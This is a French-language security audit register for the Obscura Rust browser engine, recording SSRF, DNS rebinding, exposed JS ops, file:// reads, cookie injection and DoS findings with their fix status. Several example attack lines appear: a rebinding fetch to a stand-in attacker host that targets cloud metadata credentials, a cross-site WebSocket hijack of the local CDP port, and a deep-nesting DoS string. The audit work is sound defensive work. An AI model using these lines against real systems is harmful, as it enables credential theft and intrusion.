# Obscura — Rapport d'audit sécurité (registre de findings)

> **Cible** : Obscura 0.1.0, 8 crates Rust (`C:\Users\user\AppData\Local\Temp\obscura`)
> **Date** : 2026-06-10 · **Méthode** : audit multi-agents (226 agents, 12 surfaces, find → vérification adversariale 3 angles → critique de complétude)
> **Postulat** : Obscura récupère et exécute du contenu hostile par conception (A1 site cible, A2 client CDP/MCP, A3 entrées locales, A4 supply chain).
> **Bilan** : 62 pistes levées → **47 confirmées** (6 Critique · 29 Élevée · 9 Moyenne · 3 Faible), 6 info, 17 rejetées par les vérificateurs.

---

## 0. Constat majeur — les correctifs « déjà couverts » de la roadmap sont ABSENTS de ce checkout

La feuille de route (`obscura-audit-roadmap.md`, §4) affirme que PR #279 (SSRF) et PR #280 (MCP) sont mergés. **L'audit prouve le contraire pour ce tree** (grep sur tout le dépôt = 0 occurrence) :

| Élément annoncé | Réalité dans le code |
|---|---|
| `SsrfGuardResolver` (résolution + re-check IP, anti-rebinding) | **N'existe pas** |
| `is_forbidden_ip` (helper centralisé, bloque 0.0.0.0 / IPv4-mapped / ULA) | **N'existe pas** |
| `OBSCURA_MCP_ALLOWED_ORIGINS` (allowlist Origin MCP) | **N'existe pas** |
| Plafond `Content-Length` MCP (413) | **Absent** (`vec![0u8; len]` sans borne) |

➡️ **Action préalable indispensable** : vérifier l'état réel du dépôt vs la roadmap (PRs non mergées, revert, ou mauvais checkout). Tout le bloc « SSRF/MCP traités » est à reconsidérer comme **non traité**.

---

## 1. Déjà corrigé dans cette session

| ID audit | Finding | Statut |
|---|---|---|
| **MCP-01** | `browser_navigate`/`browser_tab_new` → lecture de fichiers locaux `file://` (pas de gate `--allow-file-access` côté MCP) | ✅ **Corrigé + tests** (gate centralisé dans `obscura-browser`, flag `obscura mcp --allow-file-access`, 3 tests de non-régression verts) |
| **SSRF-02 / SSRF-03** | Client stealth (`wreq`) ne validait **rien** (ni URL initiale, ni redirections) | ✅ **Corrigé** (`validate_url` câblé en tête de boucle de `StealthHttpClient::fetch`, flag `allow_private_network` threadé). ⚠️ Tests stealth à lancer en CI Linux (pas de libclang/BoringSSL ici). |
| **CDP-01 / SSRF-05** | Chemin d'interception `Page.navigate` (`server.rs`) contournait la gate `--allow-file-access` → lecture de fichiers arbitraires par tout client CDP, flags par défaut | ✅ **Corrigé + test** (gate `url_is_file_scheme` + `allow_file_access` en tête de `process_with_interception`, avant toute mutation d'état ; test de non-régression CDP bout-en-bout vert, + contrôle que la navigation normale reste OK) |
| **SSRF-01/04/06 · OPS-01/02/03 · MCP-04** (cause racine §2.1) | Garde SSRF = vérif de chaîne pré-DNS, denylist incomplète, pas de garde au moment de la résolution → DNS rebinding + littéraux internes | ✅ **Corrigé + tests** sur les chemins **reqwest** (client nav, `op_fetch_url`, module loader) : `is_forbidden_ip` canonique (0.0.0.0/8, IPv4-mapped, ULA fc00::/7, CGNAT, NAT64, multicast, unspecified, réservé) + `SsrfDnsResolver` (résout, rejette si une IP résolue est interdite, épingle la connexion → ferme le rebinding). 8 tests verts. ⚠️ **Reste** : le client **stealth (`wreq`)** bénéficie de la denylist littérale améliorée (via `validate_url`) mais **pas encore** de la garde au moment de la résolution (resolver wreq, non compilable ici sans libclang) → **follow-up CI**. |
| **OPS-01 (+ OPS-02, OPS-04)** — `Deno.core.ops` accessible au JS de page (cause racine §2.2) | Clé maîtresse : tout `<script>` de page pouvait appeler chaque op privilégiée en direct, court-circuitant les garde-fous JS | ✅ **Corrigé + tests** : bootstrap.js enveloppé dans une **IIFE** (ses internals — `_dom`, `__ops`, bridges — ne fuient plus via l'env lexical global partagé) ; les bridges passent par un `__ops` **privé** capturé au runtime ; `Deno.core.ops` exposé à la page est **réduit** à `{op_dom, op_binding_called}` (non sensibles : op_dom = accès DOM déjà offert par `document.*` ; op_binding_called = binding A2). **op_fetch_url / op_get_cookies / op_set_cookie / op_navigate / op_url_* / op_subtle_digest retirés du realm de page** → ferme OPS-01, OPS-02 (lecture cross-origin + exfil cookies HttpOnly via op_fetch_url direct), OPS-04 (spoof de l'arg `origin`). 87 tests obscura-js + nav CDP verts. ⚠️ **Reste COOK-01** : `document.cookie` appelle toujours `op_set_cookie` via le shim → l'injection cross-site par `Domain=` reste ouverte côté Rust (`set_cookie_from_js` sans PSL) — fix séparé. |

> ⚠️ **Important** : le correctif SSRF-02/03 met le client stealth **au niveau** du client nav — mais `validate_url` lui-même est défaillant (cf. §2.1). Les deux clients restent vulnérables au DNS rebinding et à la denylist incomplète tant que SSRF-01/04/06 ne sont pas traités.

---

## 1bis. Lot de remédiation « on résout tout » (corrigés + testés)

Au-delà des 5 lignes du §1, ce lot adresse la quasi-totalité des findings restants. **Tous les tests ciblés passent** : obscura-net 49, obscura-js 87, obscura-dom 36, obscura-mcp 2, nav CDP 1 ; `cargo check --workspace --all-targets` propre.

| Finding(s) | Correctif | Test |
|---|---|---|
| **COOK-01** (injection cookie cross-site) | Validation `Domain=` : host-relationship (RFC 6265) + rejet des public-suffixes (`cookies.rs`) | ✅ 3 tests |
| **COOK-06** (jar en clair) | Permissions `0o600` (unix) sur `cookies.json` | ✅ |
| **COOK-03** | Fermé au stockage par COOK-01 | — |
| **DOM-01/02/03, MEM-01, gap-5, AX-01** (récursion → abort process) | Cap de profondeur (1000) sur le sérialiseur ; `collect_text_inner` et `import_node_from` rendus **itératifs** (`obscura-dom`) | ✅ 3 tests (50k profond) |
| **gap-3 DOM** (arène non bornée → OOM) | `MAX_NODES = 1M` dans `new_node` | ✅ |
| **MCP-02/03** (Content-Length, Origin, CORS) | Cap 16 MiB (413) ; allowlist `OBSCURA_MCP_ALLOWED_ORIGINS` (403) ; pin du `Host` (anti-rebinding) ; `ACAO:*` supprimé (`http.rs`) | ✅ test (403/413) |
| **CDP-02** (WS sans Origin) | Handshake `accept_hdr_async` + `OBSCURA_CDP_ALLOWED_ORIGINS` + pin `Host` (`server.rs`) | ✅ compile + nav |
| **OPS-HDR-01** (injection d'en-têtes) | Filtre des en-têtes interdits (Host/Cookie/Referer/Origin/Sec-*/…) dans `op_fetch_url` | ✅ |
| **NAVDOS-01/02, OPS-01** (corps non borné → OOM) | `read_body_capped` (256 MiB, env-configurable) sur client nav + `op_fetch_url` ; stealth = pré-check `Content-Length` | ✅ |
| **CDP-04** (panic slice UTF-8) | `log_truncate` sur frontière de char | ✅ |
| **OPS-04** (creds proxy loggés) | `redact_proxy` (`main.rs` + module_loader) | ✅ |
| **SUPPLY-01** (pas de checksums release) | Étape SHA-256 + upload dans `release.yml` | n/a CI |
| **SUPPLY-02** (`--locked`) | `--locked` sur `ci.yml` + `release.yml` | n/a CI |
| **MCP-04** (SSRF via tools MCP) | Couvert par le `SsrfDnsResolver` (la nav passe par le client gardé) | — |

> Note : la roadmap affirmait « pas de CI sur PR » — **faux pour ce tree** (`ci.yml` a déjà `on: pull_request`). Et `SECURITY.md` décrivait l'état *cible* (garde SSRF à la résolution, allowlist MCP, checksums) que l'audit trouvait absent ; les correctifs ci-dessus le rendent **exact**.

### Résidus documentés
- ✅ **Stealth `wreq` — resolver SSRF à la résolution : FAIT** (commit ultérieur). `StealthSsrfResolver` calqué sur le resolver reqwest, installé via `dns_resolver` → le client stealth a la **parité SSRF complète** (denylist littérale + garde à la résolution anti-rebinding + re-validation redirections + cap `Content-Length`). Validé par le **job CI stealth** (libclang) — non compilable localement. Reste seulement un cap de corps *en streaming* pour wreq (le pré-check `Content-Length` est en place).
- **COOK-04** (enforcement `SameSite` à l'egress) : nécessite de threader le site initiateur dans toute la pile HTTP (changement architectural).
- **OPS-02 cdp-domains** (jail de chemin `file://`) : nécessite une config de répertoire de base ; ne concerne que `--allow-file-access` activé.
- **AX-02** (marche d'ancêtres quadratique) : DoS CPU, non corrigé.
- **OPS-03 concurrency** (`Runtime.evaluate` boucle sync) : le `cdp_watchdog` (`terminate_execution`) est armé pour evaluate — mitigation partielle existante ; vérification fine non faite.
- **Info** : gate Semgrep (`continue-on-error`, expérimental Rust) et checksum V8 prébuilt (upstream rusty_v8 #545) laissés en l'état.

---

## 2. Findings Critique (6)

### 2.1 — SSRF : la garde est une vérification de chaîne pré-DNS, sans contrôle de l'IP résolue — ✅ **CORRIGÉ (chemins reqwest)**
**IDs** SSRF-01, OPS-01 (ops-rust), SSRF-04, OPS-01/OPS-02 (cli-config) · **A1, défaut** · `client.rs`, `ops.rs`
> **Statut** : corrigé sur le client nav, `op_fetch_url` et le module loader (denylist canonique `is_forbidden_ip` + `SsrfDnsResolver` résout-rejette-épingle, 8 tests verts). Reste : garde résolution côté stealth wreq (follow-up CI). Description d'origine ci-dessous pour archive.

`validate_url` / `validate_fetch_url` n'inspectent que `url.host()` **avant** toute résolution DNS. Aucun resolver custom n'est installé sur le client reqwest/wreq → résolution et connexion divergent. Conséquences cumulées :
- **DNS rebinding grand ouvert** : un domaine attaquant à TTL court (public → `169.254.169.254`/`127.0.0.1`/`10.x`) passe la garde, puis reqwest reconnecte sur l'IP interne. PoC : `fetch('http://rebind.attacker.com/latest/meta-data/iam/security-credentials/')` puis exfil.
- **Denylist incomplète** (même sans DNS attaquant) : passent au travers → `0.0.0.0` et `0.0.0.0/8`, IPv4-mapped IPv6 `::ffff:127.0.0.1` / `::ffff:169.254.169.254`, ULA `fc00::/7`, CGNAT `100.64/10`, NAT64 `64:ff9b::/96`, multicast, `::`. Sur Linux, `0.0.0.0` et `::ffff:127.0.0.1` joignent la loopback.
- **Hostnames internes** (SSRF-06) : `metadata.google.internal`, `kubernetes.default.svc`, `*.internal`/`*.local` ne sont pas dans les 4 littéraux bloqués → exploitables en déploiement cloud/Docker/K8s **sans** contrôle DNS attaquant.

**Remédiation** : un seul `is_forbidden_ip(IpAddr)` canonique + resolver custom (`reqwest ...resolve_to_addrs`/connector hyper) qui résout, rejette si **toute** IP résolue est interdite, et **épingle** la connexion à l'IP vérifiée ; re-valider à chaque hop de redirection ; canonicaliser IPv4-mapped/NAT64 vers IPv4 avant test. Appliquer à **nav, stealth, op_fetch_url et module_loader** (mutualiser le helper).

### 2.2 — `Deno.core.ops` reste accessible depuis le JS de page → clé maîtresse — ✅ **CORRIGÉ**
**ID** OPS-01 (bootstrap-js) · **A1, défaut** · `bootstrap.js`, `runtime.rs:121-135`
> **Statut** : corrigé (IIFE + `__ops` privé + `Deno.core.ops` réduit à `{op_dom, op_binding_called}`). Vérifié empiriquement : un probe a confirmé que les `const` top-level de bootstrap fuyaient dans le scope des scripts de page (d'où l'IIFE). 87 tests obscura-js + nav CDP verts. Reste COOK-01 (validation `Domain=` côté Rust). Description d'origine ci-dessous pour archive.

bootstrap.js construit l'environnement de page **dans le même realm V8** que `Deno.core.ops` et ne supprime jamais `Deno`. La seule étape « hide internals » met certaines clés en `enumerable:false` (ce qui **ne bloque pas** l'accès par nom) et ne matche même pas `Deno`. Les `<script>` inline de la page s'exécutent sur le même global → **le JS hostile appelle directement les 15 ops** (`op_fetch_url`, `op_set_cookie`, `op_navigate`, `op_get_cookies`, `op_dom`…), **court-circuitant tous les garde-fous JS** de bootstrap. C'est ce qui rend exploitables OPS-02/03/04 ci-dessous.

**Remédiation** : après `__obscura_init`, capturer les ops nécessaires dans une closure puis `delete globalThis.Deno` (+ alias `__bootstrap`/`core`) ; ou exécuter les scripts de page dans un contexte V8 séparé sans `Deno.core`. Ne pas se reposer sur `enumerable:false`.

> Les 6 findings « Critique » se ramènent à **2 causes racines** : (2.1) la garde SSRF et (2.2) l'exposition des ops. Les corriger désamorce une grande partie des findings Élevée.

---

## 3. Findings Élevée (29) — par thème

### 3.1 Lecture de fichiers locaux `file://` (gates contournées)
- **CDP-01 / SSRF-05** (A2, **défaut**) : ✅ **corrigé** (cf. §1). La gate `--allow-file-access` n'existait **que** dans `do_navigate` (`domains/page.rs:185`), mais `server.rs` routait tout message « Page.navigate » vers `process_with_interception` (`server.rs:413,539-571`) qui naviguait **sans** la gate ; après un attach Puppeteer/Playwright normal c'était **toujours** ce chemin qui était pris. Gate désormais appliquée en tête de `process_with_interception`.
- **MCP-01** : ✅ corrigé (cf. §1).
- Cause racine restante : `validate_url` whiteliste `file://` inconditionnellement (`client.rs:101`) — la gate est appliquée au niveau des surfaces d'entrée A2 (MCP, CDP), **pas** au niveau réseau, afin de **préserver** `obscura fetch file://` (usage opérateur A3 légitime). Tous les points d'entrée CDP/MCP de navigation sont maintenant gardés (`do_navigate`, `Target.createTarget`, `process_with_interception`, outils MCP).

### 3.2 Pas de validation Origin/Host → rebinding DNS / pilotage cross-site
- **CDP-02** (A2/A1) : handshake WebSocket via `accept_async_with_config` **sans inspection d'Origin/Host** (`server.rs:910`). Une page web quelconque ouverte dans le navigateur de la victime peut `new WebSocket('ws://127.0.0.1:9222/devtools/browser')` et piloter tout le CDP (→ chaîné avec CDP-01 = lecture fichier, vol cookies via `Network.getAllCookies`). Pas d'auth par défaut.
- **MCP-03** (A1) : transport HTTP MCP sans auth ni allowlist Origin, `Access-Control-Allow-Origin: *` codé en dur (`http.rs:91,105,182`) + Host non validé → une page attaquante pivote sur `127.0.0.1:3000/mcp` (`browser_get_cookies`, `browser_evaluate`, `browser_navigate file://`).

### 3.3 Vol de données cross-origin & poisoning cookies (via §2.2)
- **OPS-04 / OPS-02 (bootstrap)** : l'argument `origin` de `op_fetch_url` est fourni par le JS → en passant `origin` vide ou = cible, `is_cross_origin=false` : **CORS sauté + cookies (y compris HttpOnly) attachés** → lecture de réponses authentifiées cross-origin et exfil. Fix : dériver l'origine côté Rust (état moteur), jamais d'un argument d'op.
- **OPS-03 (bootstrap) / COOK-01** : `op_set_cookie` / `document.cookie` stockent un `Domain=` arbitraire **sans PSL ni contrôle host** → injection de cookie pour n'importe quel domaine parent/voisin/`com` (session fixation, poisoning du jar partagé inter-navigations).

### 3.4 SSRF — vecteurs additionnels
- **OPS-03 (ops-rust)** : ✅ **corrigé** — le **module loader** dynamique `import()` valide désormais la cible (pré-flight `validate_fetch_url` pour les littéraux IP) et hérite du `SsrfDnsResolver` du client partagé (rebinding/hostnames).
- **OPS-HDR-01** (gap, complétude) : `fetch()`/`op_fetch_url` permettent d'**overrider les en-têtes interdits** (Host/Cookie/Referer/Origin) — seul le CRLF est filtré, pas la liste des **noms** d'en-têtes → Host-header SSRF / confusion vhost / spoof credentials.
- **SSRF-02/03 (stealth)** : ✅ corrigés (cf. §1).

### 3.5 DoS — récursion non bornée & allocation non plafonnée
- **DOM-01/02/03 / MEM-01 / gap-5** : sérialiseur HTML (`serialize.rs:16,88`), `text_content` (`collect_text_inner`), setter `innerHTML` (`import_node_from`) **récursent sans cap** → **stack overflow natif → abort process** (SIGSEGV, **non rattrapable** par le `catch_unwind` de `op_dom`). Déclenchable par `'<div>'.repeat(200000)`. Aussi via `CDP DOM.getOuterHTML`, worker `DumpHtml` (threads sans catch_unwind).
- **AX-01** : `Accessibility.getFullAXTree` ré-entre la récursion via `aria-labelledby` → abort. **AX-02** : marche d'ancêtres O(depth) par nœud → CPU quadratique.
- **NAVDOS-01/02 / OPS-01 (concurrency)** : clients nav **et** stealth bufferisent **tout** le corps de réponse dans un `Vec` **sans plafond** (`client.rs` `resp.bytes()`) → OOM host par simple navigation (sans JS), non borné par `--max-old-space-size`.
- **DOM-01/02 (gap-3)** : arène de nœuds `parse_html` **sans `MAX_NODES`** → OOM host depuis une navigation OU `element.innerHTML`.
- **OPS-02/03 (concurrency) / MCP-02** : MCP HTTP alloue `vec![0u8; Content-Length]` attaquant **sans cap** (PR#280 absent).

**Remédiation transverse DoS** : cap de profondeur (itératif ou compteur) sur sérialisation/text/innerHTML ; `MAX_NODES` sur l'arène ; plafond de taille de corps (streaming + limite) sur les 2 clients ; cap `Content-Length` MCP ; cap récursion AX.

---

## 4. Findings Moyenne (9)
- **MCP-04** : `browser_evaluate`/`browser_navigate` = SSRF vers services HTTP internes (filtré seulement par denylist IP-littérale → cf. §2.1).
- **OPS-03 (concurrency)** : `Runtime.evaluate`/`callFunctionOn` en **boucle synchrone** fige tout le dispatcher CDP ; le timeout tokio est un **no-op** face à V8 synchrone (le watchdog `terminate_execution` doit être câblé).
- **COOK-04** : `SameSite` parsé mais **jamais appliqué** à l'egress (cookies envoyés en cross-site). **COOK-03** : `domain_matches` accepte un public-suffix comme domaine stocké.
- **OPS-02 (cdp-domains)** : `file://` (flag activé) sans **jail de chemin** ni restriction UNC/symlink.
- **OPS-04 (cli-config)** : URL proxy avec **credentials loggés en clair**.
- **AX-02**, **MCP-02** : cf. §3.5.
- **SUPPLY-01** : binaires de release publiés **sans checksums/signatures/provenance** ; `SECURITY.md` référence des checksums qui n'existent pas ; install `curl|tar`.

## 5. Findings Faible (3)
- **CDP-04** : slicing par offset d'octet UTF-8 dans les chemins de log → panic de la tâche connexion (DoS) sur entrée multi-octets.
- **COOK-06** : jar persisté en clair dans `{storage_dir}/cookies.json` (HttpOnly/Secure inclus), permissions non restreintes.
- **SUPPLY-02** : aucun `--locked/--frozen` sur build/test/audit (Cargo.lock non imposé).

## 6. Info (6, durcissement)
OPS-05 (`file://` whitelisté sans gate, cause racine §3.1) · Fetch.continueRequest rewrite silencieusement ignoré (map paused = code mort) · preload scripts persistent à travers create/disposeBrowserContext · `parse_http_date` underflow `day=0` (expiry faux en release / panic en debug) · gate Semgrep neutralisée par `continue-on-error` · V8 prébuilt téléchargé sans checksum.

---

## 7. Findings REJETÉES par les vérificateurs (17) — signal de qualité
Les vérificateurs adversariaux ont **écarté** (après relecture du code) notamment :
- **COOK-02** « jar partagé sans partitionnement » : réfuté tel quel (le vecteur réel est COOK-01).
- **OPS-01 (rejeté)** « la plupart des ops n'ont pas de `catch_unwind` » : **réfuté** — le protocole anti-panic est bien en place.
- **MEM-02** « UB d'aliasing mutable `&mut Page` depuis `*const` » : réfuté.
- **SSRF-07/08** (env var désactive la garde / proxy CONNECT bypass), **OPS-06** (`--v8-flags`), **OPS-04** (worker sans timeout), **CDP-03** (routage par `contains`), **COOK-05** (path prefix), **SUPPLY-03/04** (actions/Docker pinned par tag) : jugés non-issues ou hors-modèle dans ce contexte.

> Ces rejets confirment que les findings retenues ont passé un filtre ≥2/3 votes après relecture du code (pas de plausible-mais-faux).

---

## 8. Ordre de remédiation recommandé
1. **Vérifier l'état réel du dépôt vs roadmap** (§0) — les PR #279/#280 semblent absentes.
2. ~~**Garde SSRF résolue + épinglée + denylist canonique**~~ → ✅ **fait** sur reqwest (nav/op_fetch_url/module_loader) ; `is_forbidden_ip` + `SsrfDnsResolver` mutualisés. **Reste** : porter `SsrfDnsResolver` au client stealth wreq (resolver wreq) en CI Linux.
3. ~~**Retirer `Deno.core.ops` du realm de page**~~ → ✅ **fait** (IIFE + `__ops` privé + sous-ensemble sûr). Désamorce OPS-01/02/04. Reste COOK-01 (validation `Domain=` côté Rust, item 7).
4. ~~**Gate `file://` sur le chemin d'interception CDP**~~ → ✅ **fait** (CDP-01/SSRF-05 fermé ; MCP-01 déjà fait). Reste optionnel : centraliser dans `navigate_single` si l'on veut un point unique, mais sans casser `obscura fetch file://`.
5. **Allowlist Origin/Host + auth** sur CDP (WS handshake) et MCP HTTP (§3.2) ; supprimer `ACAO:*`.
6. **Caps DoS** : profondeur récursion (serialize/text/innerHTML/AX), `MAX_NODES`, plafond corps de réponse, cap `Content-Length` MCP.
7. **Cookies** : PSL + contrôle host sur `Domain=`, enforcement `SameSite`, `__Host-`/`__Secure-`.
8. **Supply chain** : checksums+signatures release, `--locked`, checksum V8, gate Semgrep réelle.
9. **Gate CI** sur `pull_request` (audit/deny/clippy/test/fuzz) — inexistant aujourd'hui.

> Tests dynamiques recommandés (M4 roadmap) : harnais « page hostile » (rebinding, `::ffff:127.0.0.1`, `0.0.0.0`, `'<div>'×200k`, corps géant), fuzzing `parse_http_date`/sérialiseur/JSON-RPC. La plupart des findings ci-dessus sont accompagnées d'un PoC reproductible dans le journal d'audit.
